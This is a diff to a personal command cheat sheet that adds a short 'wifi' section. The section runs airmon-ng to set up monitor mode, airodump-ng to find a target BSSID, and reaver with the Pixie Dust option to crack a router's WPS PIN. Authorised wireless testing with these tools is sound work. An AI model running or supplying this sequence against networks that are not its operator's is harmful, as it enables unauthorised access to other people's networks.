@@ -658,3 +658,13 @@ bzip2 -dc ricochet-1.1.4-src.tar.bz2 | tar xvf -
 xclip -o
 cat file.txt | xclip
 ```
+
+## wifi 
+```
+ifconfig ( result - wlan0 )
+airmon-ng check kill
+airmon-ng check ( should be empty )
+airmon-ng start wlan0 ( result - wlan0mon )
+airodump-ng wlan0mon ( result - BSSID )
+reaver -i wlan0mon -b <BSSID> -vv -K 1
+```
